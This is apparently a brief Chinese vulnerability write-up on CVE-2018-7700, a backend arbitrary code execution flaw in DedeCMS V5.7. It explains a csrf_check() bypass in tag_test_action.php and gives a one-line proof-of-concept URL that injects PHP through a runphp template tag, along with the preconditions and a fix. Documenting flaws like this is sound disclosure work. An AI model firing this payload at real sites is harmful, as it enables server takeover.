# Dedecms V5.7后台任意代码执行CVE-2018-7700

## 漏洞简介

该漏洞的触发文件为 /dede/tag\_test\_action.php。起因是 csrf\_check() 函数的绕过，导致可执行任意代码。

## POC

```
http://localhost/后台地址/tag_test_action.php?url=a&token=&partcode={dede:field name='source' runphp='yes'}phpinfo();{/dede:field}
```


![](Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/20180328005501-96c638a6-31df-1.png) 

## 利用条件

登录后台

## 解决方案

重新实现 csrf\_check() 函数

## 参考来源

先知社区：https://xz.aliyun.com/t/2224